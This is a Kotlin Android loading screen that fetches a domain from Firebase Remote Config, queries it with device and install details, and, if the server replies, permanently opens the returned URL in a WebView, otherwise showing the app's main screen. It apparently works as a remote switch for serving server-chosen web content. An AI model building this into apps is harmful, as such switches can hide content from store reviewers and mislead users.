package com.template

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.template.databinding.ActivityLoadingBinding
import okhttp3.*
import java.io.IOException
import java.net.URL
import java.util.*

class LoadingActivity : Activity() {
    companion object{
        const val APP_RESULT="ResultServer"
        const val APP_RESULT_BOOL= "boolResult"
        const val APP_RESULT_URL = "StringURL"
    }
    private var remoteConfig:FirebaseRemoteConfig? = null
    private val client = OkHttpClient()
    private var sharedPreferences :SharedPreferences? = null
    private var result:Boolean = false
    private var resultTrue:Boolean = true
    private var url:String = "note domain"
    private lateinit var binding: ActivityLoadingBinding
   // @SuppressLint("AppCompatMethod")
    override fun onCreate(savedInstanceState: Bundle?) {
       super.onCreate(savedInstanceState)

       binding = ActivityLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        Handler(Looper.getMainLooper()).postDelayed({
            remoteConfig = FirebaseRemoteConfig.getInstance()
            sharedPreferences =  this.getSharedPreferences(APP_RESULT, MODE_PRIVATE)
            binding.progresBar.visibility
            internetCheck()
        }, 1000)

    }

    private fun internetCheck(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        if(network==null) {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
        }else{
            val actNetwork = cm.getNetworkCapabilities(network)
            return when {
                actNetwork!!.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                    val appPrefBool = sharedPreferences?.getBoolean(APP_RESULT_BOOL, false)
                    val appPrefResultURL = sharedPreferences?.getString(APP_RESULT_URL, null)
                    if (appPrefBool!=null && appPrefResultURL !=null){
                        prefResult(appPrefBool,appPrefResultURL)

                    }else{
                        remoteConfigRead()
                        Log.d("Network","Server connection")
                    }
                    Log.d("Network", "wifi connected")
                    true
                }
                actNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                    val appPrefBool = sharedPreferences?.getBoolean(APP_RESULT_BOOL, false)
                    val appPrefResultURL = sharedPreferences?.getString(APP_RESULT_URL, null)
                    if (appPrefBool!=null && appPrefResultURL !=null){
                        prefResult(appPrefBool,appPrefResultURL)
                    }else{
                        remoteConfigRead()
                        Log.d("Network","Server connection")
                    }
                    Log.d("Network", "cellular network connected")
                    true
                }
                else -> {
                    startActivity(Intent(this, MainActivity::class.java))
                    finish()
                    false
                }
            }

        }
        //network ?:
        return false

    }


    private fun prefResult(appPrefBoolean:Boolean, appPrefResultURL:String) {
        if (!appPrefBoolean){
            startActivity(Intent(this, MainActivity::class.java))
        }else {
            val wa = Intent(this, WebActivity::class.java)
            wa.putExtra("url", appPrefResultURL)
            startActivity(wa)
            finish()
        }
    }

    private fun remoteConfigRead() {
        remoteConfig?.fetchAndActivate()
            ?.addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val domanFromFirebase = remoteConfig?.getString("check_link")
                    getLinkServer(domanFromFirebase!!)
                } else  {
                    resultServer()


                }
            }
    }

    @SuppressLint("SuspiciousIndentation")
    private fun getLinkServer(domanFromFirebase: String) {
        if (domanFromFirebase.isNotEmpty()){
            callServerResult(domanFromFirebase)
        }else{
            resultServer()
            startActivity(Intent(this, MainActivity::class.java))
            finish()
        }

    }

    private fun callServerResult(domanFromFirebase: String) {
        val userAgent = "Mozilla/5.0 (Linux; Android ${android.os.Build.VERSION.RELEASE}; ${android.os.Build.MODEL} Build/${android.os.Build.DISPLAY}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36"
        val url= URL("${domanFromFirebase}/?packageid=${this.packageName}&usserid=${UUID.randomUUID()}&getz=${TimeZone.getDefault().id}&getr=utm_source=google-play&utm_medium=organic")
        val request= Request.Builder()
            .header("User-Agent",userAgent)
            .url(url)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!response.isSuccessful){
                        resultServer()
                        throw IOException("The request to the server was not completed successfully" +
                                " ${response.code} ${response.message}")
                    }else{
                        val body = response.body?.string()
                        runOnUiThread {
                            val edit = sharedPreferences!!.edit()
                            edit.putBoolean(APP_RESULT_BOOL, resultTrue)
                            edit.putString(APP_RESULT_URL, body)
                            edit.apply()

                            val wa = Intent(this@LoadingActivity, WebActivity::class.java)
                            wa.putExtra("url", body)
                            startActivity(wa)
                            finish()
                        }
                    }
                }
            }
        })

    }

    private fun resultServer() {
       val edit = sharedPreferences!!.edit()
        edit.putBoolean(APP_RESULT_BOOL, result)
        edit.putString(APP_RESULT_URL, url)
        edit.apply()
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }



}